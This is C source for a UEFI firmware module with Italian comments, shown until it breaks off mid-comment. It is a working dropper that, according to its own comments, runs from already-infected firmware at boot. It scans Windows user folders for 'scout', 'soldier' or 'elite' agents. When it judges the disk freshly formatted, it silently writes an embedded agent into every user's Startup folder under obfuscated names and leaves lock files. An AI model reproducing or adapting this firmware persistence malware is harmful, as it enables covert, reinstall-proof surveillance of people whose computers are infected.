/*********************************/
/*   Developer: Giovanni Cino    */
/*********************************/
#define IMAGE_FILE_MACHINE_ARMTHUMB_MIXED  0x01c2

#include <Uefi.h>
#include <Guid/FileInfo.h>
#include <Protocol/LoadedImage.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/DebugLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/DevicePathLib.h>
#include <Library/FileHandleLib.h>
#include <Library/PrintLib.h>
#include <Library/UefiLib.h>

#include <Protocol/BlockIo.h>
#include <Protocol/DiskIo.h>
#include <Protocol/SimpleFileSystem.h>
#include <Protocol/UnicodeCollation.h>
#include <Protocol/LoadedImage.h>
#include <Pi/PiMultiPhase.h>
#include <Protocol/FirmwareVolume2.h>
#include <Protocol/FirmwareVolume.h>
#include <Protocol/LoadedImage.h>
#include <Protocol/DevicePath.h>

#include <Library/PcdLib.h>
#include <Library/DebugLib.h>
#include <Library/UefiLib.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>


//#define FORCE_DEBUG



#define EFI_GLOBAL_FILE_VARIABLE_GUID \
  { \
    0x8BE4DF61, 0x93CA, 0x11d2, {0xAA, 0x0D, 0x00, 0xE0, 0x98, 0x30, 0x22, 0x88} \
  }

#define FILE_NAME_SCOUT L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
#define FILE_NAME_SOLDIER L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
#define FILE_NAME_ELITE  L"\\AppData\\Local\\"
#define DIR_NAME_ELITE L"\\AppData\\Local\\Microsoft\\"


// (20 * (6+5+2))+1) unicode characters from EFI FAT spec (doubled for bytes)
#define MAX_FILE_NAME_LEN 512
#define FIND_XXXXX_FILE_BUFFER_SIZE (SIZE_OF_EFI_FILE_INFO + MAX_FILE_NAME_LEN)
#define CALC_OFFSET(type, base, offset) (type)((UINTN)base + (UINT32) offset)

#ifdef FORCE_DEBUG
UINT16 g_NAME_SCOUT[] =   L"scoute.exe";
UINT16 g_NAME_SOLDIER[] = L"soldier.exe";
UINT16 g_NAME_ELITE[]   = L"elite";
#else
//32 byte per inserire 16 caratteri unicode
UINT16 g_NAME_SCOUT[] =   L"6To_60S7K_FU06yjEhjh5dpFw96549UU";
UINT16 g_NAME_SOLDIER[] = L"kdfas7835jfwe09j29FKFLDOR3r35fJR";
UINT16 g_NAME_ELITE[]   = L"eorpekf3904kLDKQO023iosdn93smMXK";
#endif
//non mi piace usare queste due variabili globali ma altrimenti sporcherei troppo il codice
UINTN pSectiondata;
UINTN VirtualSize;

EFI_GUID  gEfiGlobalFileVariableGuid = EFI_GLOBAL_FILE_VARIABLE_GUID;
EFI_SYSTEM_TABLE                 *gST;
EFI_STATUS                                    

UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable);

extern EFI_RUNTIME_SERVICES  *gRT;

typedef UINT8 EFI_SECTION_TYPE;



/** Leggo in NvRam la variabile fTA

	Step 1)
	In fase di BOOT, il firmware UEFI precedentemente infettato, controlla la variabile fTA in NvRam se fTA==FALSE o non esistente, 
	procedo con l'infezione altrimenti se fTA==TRUE procedo col BOOT normalmente senza infettare il sistema.

**/
BOOLEAN
EFIAPI
CheckfTA()
{
	EFI_STATUS                    Status = EFI_SUCCESS;

	UINTN  VarDataSize;
	UINT8  VarData;

	VarData=0;
	VarDataSize=sizeof(VarData);
	Status=gRT->GetVariable(L"fTA", &gEfiGlobalFileVariableGuid, NULL, &VarDataSize, (UINTN*)&VarData);

	if(Status!=EFI_SUCCESS || VarData==0)
	{
#ifdef FORCE_DEBUG
		Print(L"Devo Infettare\n");
#endif
		return FALSE;
	}

#ifdef FORCE_DEBUG
	Print(L"NON Devo Infettare\n");
#endif
    return TRUE;
}

/** Setto in NvRam la variabile fTA

**/
BOOLEAN
EFIAPI
SetfTA()
{
	EFI_STATUS                    Status = EFI_SUCCESS;
	UINT8 VarData;

	VarData=1;
	Status=gRT->SetVariable(L"fTA", &gEfiGlobalFileVariableGuid, EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS, sizeof(VarData),(UINTN*)&VarData);

	if(Status!=EFI_SUCCESS)
	{
#ifdef FORCE_DEBUG
		Print(L"Non riesco a settare fTA\n");
#endif
		return FALSE;
	}
#ifdef FORCE_DEBUG
	Print(L"fTA settato a TRUE\n");
#endif
    return TRUE;
}


/** 
	Atrue: Agent installato => Esiste sotto la cartella �startup� il file associato allo scout o al soldier oppure esiste in %tmp%\..\Microsoft la cartella nascosta associata all'elite
	Afalse: Agente non installato 
	Ltrue => Esiste un file vuoto in %tmp%\..\ che ha lo stesso nome della cartella elite
	Lfalse: Lock non esistente
**/

UINTN
EFIAPI
CheckAL(
  IN CHAR16	*  FileNameUser,
  IN EFI_FILE_HANDLE CurDir
  )
{
	EFI_STATUS						Status = EFI_SUCCESS;

	UINTN AL;
	BOOLEAN A;
	BOOLEAN L;

	EFI_FILE_HANDLE	TestFileHandleUser=NULL;

	CHAR16* FileNameScout;
	CHAR16* FileNameSoldier;
	CHAR16* DirNameElite;
	CHAR16* FileNameElite;
	
	FileNameScout = AllocateZeroPool(260*sizeof(CHAR16));
	FileNameSoldier = AllocateZeroPool(260*sizeof(CHAR16));
	DirNameElite = AllocateZeroPool(260*sizeof(CHAR16));
	FileNameElite = AllocateZeroPool(260*sizeof(CHAR16));
	

	StrCpy(FileNameScout,FileNameUser);
	StrCat(FileNameScout, FILE_NAME_SCOUT);
	StrCat(FileNameScout, g_NAME_SCOUT);

	StrCpy(FileNameSoldier,FileNameUser);
	StrCat(FileNameSoldier, FILE_NAME_SOLDIER);
	StrCat(FileNameSoldier, g_NAME_SOLDIER);
	
	StrCpy(FileNameElite,FileNameUser);
	StrCat(FileNameElite,FILE_NAME_ELITE);
	StrCat(FileNameElite,g_NAME_ELITE);

	StrCpy(DirNameElite,FileNameUser);
	StrCat(DirNameElite, DIR_NAME_ELITE);
	StrCat(DirNameElite, g_NAME_ELITE);

	
	A=FALSE;
	
	Status = CurDir->Open (CurDir, &TestFileHandleUser, FileNameScout, EFI_FILE_MODE_READ, 0);  
	if (EFI_ERROR(Status)) 
	{
#ifdef FORCE_DEBUG
			Print(L"File [%s] non trovato\n",FileNameScout);
#endif

			Status = CurDir->Open (CurDir, &TestFileHandleUser, FileNameSoldier, EFI_FILE_MODE_READ, 0);  
			if (EFI_ERROR(Status)) 
			{
#ifdef FORCE_DEBUG
					Print(L"File [%s] non trovato\n",FileNameSoldier);
#endif
					Status = CurDir->Open (CurDir, &TestFileHandleUser, DirNameElite, EFI_FILE_MODE_READ, 0);  
					if (EFI_ERROR(Status)) 
					{
#ifdef FORCE_DEBUG
						Print(L"Cartella [%s] non trovato\n",DirNameElite);
#endif
					}
					else
					{
						A=TRUE;
#ifdef FORCE_DEBUG
						Print(L"Cartella [%s] TROVATA\n",DirNameElite);
#endif
						//chiudo il file aperto
						Status = TestFileHandleUser->Close(TestFileHandleUser);
						if (EFI_ERROR(Status)) {
#ifdef FORCE_DEBUG
							Print(L"Can not close the file %s\n",DirNameElite);
#endif
						}
					}
			}
			else
			{
				A=TRUE;
#ifdef FORCE_DEBUG
				Print(L"File [%s] TROVATO\n",FileNameSoldier);
#endif
				//chiudo il file aperto
				Status = TestFileHandleUser->Close(TestFileHandleUser);
				if (EFI_ERROR(Status)) {
#ifdef FORCE_DEBUG
					Print(L"Can not close the file %s\n",FileNameSoldier);
#endif
				}
			}

	}
	else
	{
		A=TRUE;
#ifdef FORCE_DEBUG
		Print(L"File [%s] TROVATO\n",FileNameScout);
#endif
		//chiudo il file aperto
		Status = TestFileHandleUser->Close(TestFileHandleUser);
		if (EFI_ERROR(Status)) {
#ifdef FORCE_DEBUG
	        Print(L"Can not close the file %s\n",FileNameScout);
#endif
	    }
	}


	L=FALSE;

	Status = CurDir->Open (CurDir, &TestFileHandleUser, FileNameElite, EFI_FILE_MODE_READ, 0);  
	if (EFI_ERROR(Status)) 
	{
#ifdef FORCE_DEBUG
		Print(L"File [%s] non trovato\n",FileNameElite);
#endif
	}
	else
	{
		L=TRUE;
#ifdef FORCE_DEBUG
		Print(L"File [%s] TROVATO\n",FileNameElite);
#endif
		//chiudo il file aperto
		Status = TestFileHandleUser->Close(TestFileHandleUser);
		if (EFI_ERROR(Status)) 
		{
#ifdef FORCE_DEBUG
			Print(L"Can not close the file %s\n",FileNameElite);
#endif
		}
	}


	AL=0;
	AL=(UINTN)A*2+(UINTN)L;

	FreePool(FileNameScout);
	FreePool(FileNameSoldier);
	FreePool(DirNameElite);
	FreePool(FileNameElite);

	return AL;
}

EFI_STATUS
EFIAPI
InstallAgent(
  IN EFI_FILE_HANDLE CurDir,
  IN CHAR16	*  FileNameUser
  )
{
	EFI_STATUS						Status = EFI_SUCCESS;
	EFI_FILE_HANDLE  FileHandle;
	CHAR16* FileNameScout;
	
	FileNameScout = AllocateZeroPool(260*sizeof(CHAR16));
	StrCpy(FileNameScout,FileNameUser);
	StrCat(FileNameScout, FILE_NAME_SCOUT);
	StrCat(FileNameScout, g_NAME_SCOUT);

	
	Status = CurDir->Open (CurDir, &FileHandle, FileNameScout, EFI_FILE_MODE_READ|EFI_FILE_MODE_WRITE|EFI_FILE_MODE_CREATE, 0);
	
	FreePool(FileNameScout);

	if (EFI_ERROR(Status)) 
	{
#ifdef FORCE_DEBUG
		Print(L"Error Open Agent File\n");
#endif
		return Status;
	}
	
#ifdef FORCE_DEBUG
		Print(L"FileHandle->Write ... VirtualSize=%x [0]=%x [1]=%x [2]=%x [3]=%x\n",VirtualSize,((UINT8*)pSectiondata)[0],((UINT8*)pSectiondata)[1] * 0x100 ,((UINT8*)pSectiondata)[2] * 0x10000,((UINT8*)pSectiondata)[3] * 0x1000000);
#endif

	Status=FileHandle->Write(FileHandle,&VirtualSize,(UINT8*)(pSectiondata));
	if( Status != EFI_SUCCESS ) 
	{
#ifdef FORCE_DEBUG
		Print(L"Write File Agent Failed\n");
#endif
		return Status;
	}
	else
	{
#ifdef FORCE_DEBUG
		Print(L"InstallAgent OK\n");
#endif
	}

	Status=FileHandle->Close(FileHandle);
	if( Status != EFI_SUCCESS ) 
	{
#ifdef FORCE_DEBUG
		Print(L"Closing File Agent Failed\n");
#endif
		return Status;
	}

	return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
InsertFileLock(
  IN EFI_FILE_HANDLE CurDir,
  IN CHAR16	*  FileNameUser
  )
{
	EFI_STATUS						Status = EFI_SUCCESS;
	EFI_FILE_HANDLE  FileHandle;
	CHAR16* FileNameElite;
	
	FileNameElite = AllocateZeroPool(260*sizeof(CHAR16));
	
	StrCpy(FileNameElite,FileNameUser);
	StrCat(FileNameElite,FILE_NAME_ELITE);
	StrCat(FileNameElite,g_NAME_ELITE);
#ifdef FORCE_DEBUG
	Print(L"sto tentando di scrivere: %s\n",FILE_NAME_ELITE);
#endif

	Status = CurDir->Open (CurDir, &FileHandle, FileNameElite, EFI_FILE_MODE_READ|EFI_FILE_MODE_WRITE|EFI_FILE_MODE_CREATE, 0);

	FreePool(FileNameElite);
	
	if (EFI_ERROR(Status)) 
	{
#ifdef FORCE_DEBUG
		Print(L"Error Open File InsertFileLock\n");
#endif
		return Status;
	}
	else
	{
#ifdef FORCE_DEBUG
		Print(L"InsertFileLock OK\n");
#endif
	}


	Status=FileHandle->Close(FileHandle);
	if( Status != EFI_SUCCESS ) 
	{
#ifdef FORCE_DEBUG
		Print(L"Closing InsertFileLock File Failed\n");
#endif
		return Status;
	}


	return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
RemoveFileLock(
  IN EFI_FILE_HANDLE CurDir,
  IN CHAR16	*  FileNameUser
  )
{
	EFI_STATUS						Status = EFI_SUCCESS;
	EFI_FILE_HANDLE  FileHandle;
	CHAR16* FileNameElite;
	
	FileNameElite = AllocateZeroPool(260*sizeof(CHAR16));
	
	StrCpy(FileNameElite,FileNameUser);
	StrCat(FileNameElite,FILE_NAME_ELITE);
	StrCat(FileNameElite,g_NAME_ELITE);

	
	Status = CurDir->Open (CurDir, &FileHandle, FileNameElite, EFI_FILE_MODE_READ|EFI_FILE_MODE_WRITE, 0);

	FreePool(FileNameElite);

	if (EFI_ERROR(Status)) 
	{
#ifdef FORCE_DEBUG
		Print(L"Error Open File RemoveFileLock\n");
#endif
		return Status;
	}
	else
	{
#ifdef FORCE_DEBUG
		Print(L"RemoveFileLock OK\n");
#endif
	}


	Status=FileHandle->Delete(FileHandle);
	if( Status != EFI_SUCCESS ) 
	{
#ifdef FORCE_DEBUG
		Print(L"Write RemoveFileLock File Failed\n");
#endif
		return Status;
	}

	return EFI_SUCCESS;
}



BOOLEAN
EFIAPI
TestIsUserNotEmpty(
  IN EFI_FILE_HANDLE CurDir
  )
{
  EFI_STATUS      Status;
  EFI_FILE_INFO   *FileInfo;
  BOOLEAN         NoFile;
  BOOLEAN         RetVal;

  CHAR16	*FileNameDesktop;
  EFI_FILE_HANDLE	TestFileHandleDesktop=NULL;

  UINTN AL;

  BOOLEAN IsUser;
  BOOLEAN IsFormat;

  EFI_FILE_HANDLE	FileHandle=NULL;
  
  RetVal = TRUE;
  NoFile = FALSE;
  
  Status = CurDir->Open (CurDir, &FileHandle, L".\\Users", EFI_FILE_MODE_READ, 0);  

  FileInfo = NULL;
  FileNameDesktop = AllocateZeroPool(260*sizeof(CHAR16));

  IsUser=FALSE;
  IsFormat=TRUE;

  for ( Status = FileHandleFindFirstFile(FileHandle, &FileInfo);
	    !NoFile;
		Status = FileHandleFindNextFile(FileHandle, FileInfo, &NoFile) 
	   )
  {
    if (FileInfo==NULL) 
	{
		Status = FileHandle->Close(FileHandle);
		FreePool(FileNameDesktop);
		return FALSE;
	}
#ifdef FORCE_DEBUG
	Print(L"[[[NomeFile:: %s FileSize:: %d]]]\n",FileInfo->FileName,FileInfo->FileSize);
#endif

	if ( StrStr(FileInfo->FileName, L".") == FileInfo->FileName  ) continue;
	if ( StrStr(FileInfo->FileName, L"..") == FileInfo->FileName  ) continue;
	if ( StrStr(FileInfo->FileName, L"Public") == FileInfo->FileName  ) continue;
	if ( StrStr(FileInfo->FileName, L"Administrator") == FileInfo->FileName  ) continue;

	//Per aumentare la probabilita' che la cartella sia di un utente vero e non che sia stata creata da
	// manualmente controllo che vi sia la sottocartella Desktop

	ZeroMem(FileNameDesktop, 260 * sizeof(CHAR16));

	StrCpy(FileNameDesktop, L".\\Users\\");
	StrCat(FileNameDesktop, FileInfo->FileName);
	StrCat(FileNameDesktop, L"\\Desktop");
#ifdef FORCE_DEBUG
	Print(L"%s\n",FileNameDesktop);
#endif

	Status = CurDir->Open (CurDir, &TestFileHandleDesktop, FileNameDesktop, EFI_FILE_MODE_READ, 0);  
	if (EFI_ERROR(Status)) 
	{
		continue;
	}
	//chiudo il file aperto
	Status = TestFileHandleDesktop->Close(TestFileHandleDesktop);
    if (EFI_ERROR(Status)) 
	{
#ifdef FORCE_DEBUG
        Print(L"Can not close the file %s\n",FileNameDesktop);
#endif
    }

	//se arrivo qua � perche' riscontro un possibile utente

	ZeroMem(FileNameDesktop, 260 * sizeof(CHAR16));

	StrCpy(FileNameDesktop, L".\\Users\\");
	StrCat(FileNameDesktop, FileInfo->FileName);
#ifdef FORCE_DEBUG
	Print(L"Nome Utente Trovato:%s\n",FileInfo->FileName);
#endif
	AL=CheckAL(FileNameDesktop,CurDir);

	switch (AL) {
	case 0:
#ifdef FORCE_DEBUG
		Print(L"case 0\n");
#endif
		break;
	case 1:
#ifdef FORCE_DEBUG
		Print(L"case 1\n");
#endif
		RemoveFileLock(CurDir,FileNameDesktop);			
		IsFormat = FALSE;
		break;
	case 2:
#ifdef FORCE_DEBUG
		Print(L"case 2\n");
#endif
	    InsertFileLock(CurDir,FileNameDesktop);
		IsUser=TRUE;
		IsFormat=FALSE;
		break;
	case 3:
#ifdef FORCE_DEBUG
		Print(L"case 3\n");
#endif
		IsUser=TRUE;
		IsFormat=FALSE;
		break;
	}
  } // end for

 
	Status = FileHandle->Close(FileHandle);
	if (EFI_ERROR(Status)) 
	{
#ifdef FORCE_DEBUG
		Print(L"Can not close the file %s\n",FileHandle);
#endif
	}

  if(IsFormat == TRUE) 
  {
	    //siglifica che il pc � stato formattato
	    //installo l'Agent=> Scout e creo il file di Lock su tutti gli utenti del sistema
#ifdef FORCE_DEBUG
	    Print(L"IsFormat == TRUE\n");
#endif

		Status = CurDir->Open (CurDir, &FileHandle, L".\\Users", EFI_FILE_MODE_READ, 0);  

		RetVal = TRUE;
		NoFile = FALSE;

		FileInfo = NULL;
		
		for ( Status = FileHandleFindFirstFile(FileHandle, &FileInfo);
			!NoFile;
			Status = FileHandleFindNextFile(FileHandle, FileInfo, &NoFile) 
		   )
		{
			if (FileInfo==NULL) 
			{
#ifdef FORCE_DEBUG
				Print(L"FileInfo==NULL\n");
#endif
				Status = FileHandle->Close(FileHandle);
				return FALSE;
			}
#ifdef FORCE_DEBUG
			Print(L"[[[NomeFile:::: %s FileSize:: %d]]]\n",FileInfo->FileName,FileInfo->FileSize);
#endif

			ZeroMem(FileNameDesktop, 260 * sizeof(CHAR16));

			if ( StrStr(FileInfo->FileName, L".") == FileInfo->FileName  ) continue;
			if ( StrStr(FileInfo->FileName, L"..") == FileInfo->FileName  ) continue;
			if ( StrStr(FileInfo->FileName, L"Public") == FileInfo->FileName  ) continue;
			if ( StrStr(FileInfo->FileName, L"Administrator") == FileInfo->FileName  ) continue;

			//Per aumentare la probabilita' che la cartella sia di un utente vero e non che sia stata creata da
			// manualmente controllo che vi sia la sottocartella Desktop

			ZeroMem(FileNameDesktop, 260 * sizeof(CHAR16));

			StrCpy(FileNameDesktop, L".\\Users\\");
			StrCat(FileNameDesktop, FileInfo->FileName);
			StrCat(FileNameDesktop, L"\\Desktop");

			Status = CurDir->Open (CurDir, &TestFileHandleDesktop, FileNameDesktop, EFI_FILE_MODE_READ, 0);  
			if (EFI_ERROR(Status)) 
			{
				continue;
			}
			//chiudo il file aperto
			Status = TestFileHandleDesktop->Close(TestFileHandleDesktop);
			if (EFI_ERROR(Status)) 
			{
#ifdef FORCE_DEBUG
				Print(L"Can not close the file %s\n",FileNameDesktop);
#endif
			}

			//se arrivo qua � perche' riscontro un possibile utente

			ZeroMem(FileNameDesktop, 260 * sizeof(CHAR16));
			StrCpy(FileNameDesktop, L".\\Users\\");
			StrCat(FileNameDesktop, FileInfo->FileName);
			
			//Installo l'Agent
			InstallAgent(CurDir,FileNameDesktop);

			//Creo il file di Lock per questo utente 
			InsertFileLock(CurDir,FileNameDesktop);

	}

	Status = FileHandle->Close(FileHandle);
	if (EFI_ERROR(Status)) 
	{
#ifdef FORCE_DEBUG
		Print(L"Can not close the file %s\n",FileHandle);
#endif
	}
  }

  if(IsFormat == FALSE && IsUser == FALSE) 
  {
#ifdef FORCE_DEBUG
	  Print(L"IsFormat == FALSE && IsUser == FALSE\n");
#endif
	  //significa che sono stati rimossi volutamente tutti gli agenti => disabilito l'UEFI settando la variabile  fTA=TRUE
	  SetfTA();
  }

#ifdef FORCE_DEBUG
	Print(L"NomeFile::exit\n");
#endif


  FreePool(FileNameDesktop);

  return FALSE;
}


/**
  This function will retrieve the information about the file for the handle
  specified and store it in allocated pool memory.

  This function allocates a buffer to store the file's information. It is the
  caller's responsibility to free the buffer

  @param  FileHandle  The file handle of the file for which information is
  being requested.

  @retval NULL information could not be retrieved.

  @return the information about the file
**/
EFI_FILE_INFO*
EFIAPI
FileHandleGetInfo (
  IN EFI_FILE_HANDLE            FileHandle
  )
{
  EFI_FILE_INFO   *FileInfo;
  UINTN           FileInfoSize;
  EFI_STATUS      Status;

  if (FileHandle == NULL) {
    return (NULL);
  }

  //
  // Get the required size to allocate
  //
  FileInfoSize = 0;
  FileInfo = NULL;
  Status = FileHandle->GetInfo(FileHandle,
                               &gEfiFileInfoGuid,
                               &FileInfoSize,
                               NULL);
  if (Status == EFI_BUFFER_TOO_SMALL){
    //
    // error is expected.  getting size to allocate
    //
    FileInfo = AllocateZeroPool(FileInfoSize);
    //
    // now get the information
    //
    Status = FileHandle->GetInfo(FileHandle,
                                 &gEfiFileInfoGuid,
                                 &FileInfoSize,
                                 FileInfo);
    //
    // if we got an error free the memory and return NULL
    //
    if (EFI_ERROR(Status) && (FileInfo != NULL)) {
      FreePool(FileInfo);
      FileInfo = NULL;
    }
  }
  return (FileInfo);
}


/**
  Set the current position in a file.

  This function sets the current file position for the handle to the position
  supplied. With the exception of seeking to position 0xFFFFFFFFFFFFFFFF, only
  absolute positioning is supported, and seeking past the end of the file is
  allowed (a subsequent write would grow the file). Seeking to position
  0xFFFFFFFFFFFFFFFF causes the current position to be set to the end of the file.
  If FileHandle is a directory, the only position that may be set is zero. This
  has the effect of starting the read process of the directory entries over.

  @param FileHandle             The file handle on which the position is being set
  @param Position               Byte position from begining of file

  @retval EFI_SUCCESS           Operation completed sucessfully.
  @retval EFI_UNSUPPORTED       the seek request for non-zero is not valid on
                                directories.
  @retval INVALID_PARAMETER     One of the parameters has an invalid value.
**/
EFI_STATUS
EFIAPI
FileHandleSetPosition (
  IN EFI_FILE_HANDLE    FileHandle,
  IN UINT64             Position
  )
{
  //
  // ASSERT if FileHandle is NULL
  //
  ASSERT (FileHandle != NULL);
  //
  // Perform the SetPosition based on EFI_FILE_PROTOCOL
  //
  return (FileHandle->SetPosition(FileHandle, Position));
}

/**
  function to determine if a given handle is a directory handle

  if DirHandle is NULL then ASSERT()

  open the file information on the DirHandle and verify that the Attribute
  includes EFI_FILE_DIRECTORY bit set.

  @param DirHandle              Handle to open file

  @retval EFI_SUCCESS           DirHandle is a directory
  @retval EFI_INVALID_PARAMETER DirHandle did not have EFI_FILE_INFO available
  @retval EFI_NOT_FOUND         DirHandle is not a directory
**/
EFI_STATUS
EFIAPI
FileHandleIsDirectory (
  IN EFI_FILE_HANDLE            DirHandle
  )
{
  EFI_FILE_INFO *DirInfo;
  
  //
  // ASSERT if DirHandle is NULL
  //
  ASSERT(DirHandle != NULL);

  //
  // get the file information for DirHandle
  //
  DirInfo = FileHandleGetInfo (DirHandle);
  //
  // Parse DirInfo
  //
  if (DirInfo == NULL) {
    //
    // We got nothing...
    //
    return (EFI_INVALID_PARAMETER);
  }
  if ((DirInfo->Attribute & EFI_FILE_DIRECTORY) == 0) {
    //
    // Attributes say this is not a directory
    //
    FreePool (DirInfo);
    return (EFI_NOT_FOUND);
  }
  //
  // all good...
  //
  FreePool (DirInfo);
  return (EFI_SUCCESS);
}

/** Retrieve first entry from a directory.

  This function takes an open directory handle and gets information from the
  first entry in the directory.  A buffer is allocated to contain
  the information and a pointer to the buffer is returned in *Buffer.  The
  caller can use FileHandleFindNextFile() to get subsequent directory entries.

  The buffer will be freed by FileHandleFindNextFile() when the last directory
  entry is read.  Otherwise, the caller must free the buffer, using FreePool,
  when finished with it.

  @param[in]  DirHandle         The file handle of the directory to search.
  @param[out] Buffer            The pointer to pointer to buffer for file's information.

  @retval EFI_SUCCESS           Found the first file.
  @retval EFI_NOT_FOUND         Cannot find the directory.
  @retval EFI_NO_MEDIA          The device has no media.
  @retval EFI_DEVICE_ERROR      The device reported an error.
  @retval EFI_VOLUME_CORRUPTED  The file system structures are corrupted.
  @return Others                status of FileHandleGetInfo, FileHandleSetPosition,
                                or FileHandleRead
**/
EFI_STATUS
EFIAPI
FileHandleFindFirstFile (
  IN EFI_FILE_HANDLE            DirHandle,
  OUT EFI_FILE_INFO             **Buffer
  )
{
  EFI_STATUS    Status;
  UINTN         BufferSize;


  if (Buffer == NULL || DirHandle == NULL) {
    return (EFI_INVALID_PARAMETER);
  }

  //
  // verify that DirHandle is a directory
  //
  Status = FileHandleIsDirectory(DirHandle);
  if (EFI_ERROR(Status)) {
    return (Status);
  }

  //
  // Allocate a buffer sized to struct size + enough for the string at the end
  //
  BufferSize = FIND_XXXXX_FILE_BUFFER_SIZE;
  *Buffer = AllocateZeroPool(BufferSize);
  if (*Buffer == NULL){
    return (EFI_OUT_OF_RESOURCES);
  }


  //
  // reset to the begining of the directory
  //
  Status = FileHandleSetPosition(DirHandle, 0);
  if (EFI_ERROR(Status)) {
    FreePool(*Buffer);
    *Buffer = NULL;
    return (Status);
  }


  //
  // read in the info about the first file
  //
  Status = FileHandleRead (DirHandle, &BufferSize, *Buffer);
  ASSERT(Status != EFI_BUFFER_TOO_SMALL);
  if (EFI_ERROR(Status) || BufferSize == 0) {
    FreePool(*Buffer);
    *Buffer = NULL;
    if (BufferSize == 0) {
      return (EFI_NOT_FOUND);
    }
    return (Status);
  }
  return (EFI_SUCCESS);
}

/**
  This function reads information from an opened file.

  If FileHandle is not a directory, the function reads the requested number of
  bytes from the file at the file's current position and returns them in Buffer.
  If the read goes beyond the end of the file, the read length is truncated to the
  end of the file. The file's current position is increased by the number of bytes
  returned.  If FileHandle is a directory, the function reads the directory entry
  at the file's current position and returns the entry in Buffer. If the Buffer
  is not large enough to hold the current directory entry, then
  EFI_BUFFER_TOO_SMALL is returned and the current file position is not updated.
  BufferSize is set to be the size of the buffer needed to read the entry. On
  success, the current position is updated to the next directory entry. If there
  are no more directory entries, the read returns a zero-length buffer.
  EFI_FILE_INFO is the structure returned as the directory entry.

  @param FileHandle             the opened file handle
  @param BufferSize             on input the size of buffer in bytes.  on return
                                the number of bytes written.
  @param Buffer                 the buffer to put read data into.

  @retval EFI_SUCCESS           Data was read.
  @retval EFI_NO_MEDIA          The device has no media.
  @retval EFI_DEVICE_ERROR      The device reported an error.
  @retval EFI_VOLUME_CORRUPTED  The file system structures are corrupted.
  @retval EFI_BUFFER_TO_SMALL   Buffer is too small. ReadSize contains required
                                size.

**/
EFI_STATUS
EFIAPI
FileHandleRead(
  IN EFI_FILE_HANDLE            FileHandle,
  IN OUT UINTN                  *BufferSize,
  OUT VOID                      *Buffer
  )
{
  //
  // ASSERT if FileHandle is NULL
  //
  ASSERT (FileHandle != NULL);

  //
  // Perform the read based on EFI_FILE_PROTOCOL
  //
  return (FileHandle->Read(FileHandle, BufferSize, Buffer));
}

EFI_HANDLE*
EFIAPI
GetHandleListByProtocol (
  IN CONST EFI_GUID *ProtocolGuid OPTIONAL
  )
{
  EFI_HANDLE          *HandleList;
  UINTN               Size;
  EFI_STATUS          Status;

  Size = 0;
  HandleList = NULL;

  //
  // We cannot use LocateHandleBuffer since we need that NULL item on the ends of the list!
  //
  if (ProtocolGuid == NULL) {
    Status = gBS->LocateHandle(AllHandles, NULL, NULL, &Size, HandleList);
    if (Status == EFI_BUFFER_TOO_SMALL) {
      HandleList = AllocateZeroPool(Size + sizeof(EFI_HANDLE));
      if (HandleList == NULL) {
        return (NULL);
      }
      Status = gBS->LocateHandle(AllHandles, NULL, NULL, &Size, HandleList);
      HandleList[Size/sizeof(EFI_HANDLE)] = NULL;
    }
  } else {
    Status = gBS->LocateHandle(ByProtocol, (EFI_GUID*)ProtocolGuid, NULL, &Size, HandleList);
    if (Status == EFI_BUFFER_TOO_SMALL) {
      HandleList = AllocateZeroPool(Size + sizeof(EFI_HANDLE));
      if (HandleList == NULL) {
        return (NULL);
      }
      Status = gBS->LocateHandle(ByProtocol, (EFI_GUID*)ProtocolGuid, NULL, &Size, HandleList);
      HandleList[Size/sizeof(EFI_HANDLE)] = NULL;
    }
  }
  if (EFI_ERROR(Status)) {
    if (HandleList != NULL) {
      FreePool(HandleList);
    }
    return (NULL);
  }
  return (HandleList);
}


/** Retrieve next entries from a directory.

  To use this function, the caller must first call the FileHandleFindFirstFile()
  function to get the first directory entry.  Subsequent directory entries are
  retrieved by using the FileHandleFindNextFile() function.  This function can
  be called several times to get each entry from the directory.  If the call of
  FileHandleFindNextFile() retrieved the last directory entry, the next call of
  this function will set *NoFile to TRUE and free the buffer.

  @param[in]  DirHandle         The file handle of the directory.
  @param[out] Buffer            The pointer to buffer for file's information.
  @param[out] NoFile            The pointer to boolean when last file is found.

  @retval EFI_SUCCESS           Found the next file, or reached last file
  @retval EFI_NO_MEDIA          The device has no media.
  @retval EFI_DEVICE_ERROR      The device reported an error.
  @retval EFI_VOLUME_CORRUPTED  The file system structures are corrupted.
**/
EFI_STATUS
EFIAPI
FileHandleFindNextFile(
  IN EFI_FILE_HANDLE          DirHandle,
  OUT EFI_FILE_INFO          *Buffer,
  OUT BOOLEAN                *NoFile
  )
{
  EFI_STATUS    Status;
  UINTN         BufferSize;

  //
  // ASSERTs for DirHandle or Buffer or NoFile poitners being NULL
  //
  ASSERT (DirHandle != NULL);
  ASSERT (Buffer    != NULL);
  ASSERT (NoFile    != NULL);

  //
  // This BufferSize MUST stay equal to the originally allocated one in GetFirstFile
  //
  BufferSize = FIND_XXXXX_FILE_BUFFER_SIZE;

  //
  // read in the info about the next file
  //
  Status = FileHandleRead (DirHandle, &BufferSize, Buffer);
  ASSERT(Status != EFI_BUFFER_TOO_SMALL);
  if (EFI_ERROR(Status)) {
    return (Status);
  }

  //
  // If we read 0 bytes (but did not have erros) we already read in the last file.
  //
  if (BufferSize == 0) {
    FreePool(Buffer);
    *NoFile = TRUE;
  }

  return (EFI_SUCCESS);
}





/** Controllo se vi sono utenti installati nel sistema

	Step 2)

	NO: Se nel sistema non vi sono utenti  significa che il sistema � vergine, per cui non devo fare nessuna operazione.

	SI: Se nel sistema vi � uno o piu' utenti devo procedere la seguente analisi per ogni utente

    ATTENZIONE: se si recovera il pc o si prende un pc vergine l'utente Administrator esiste, per cui se vi � solo 
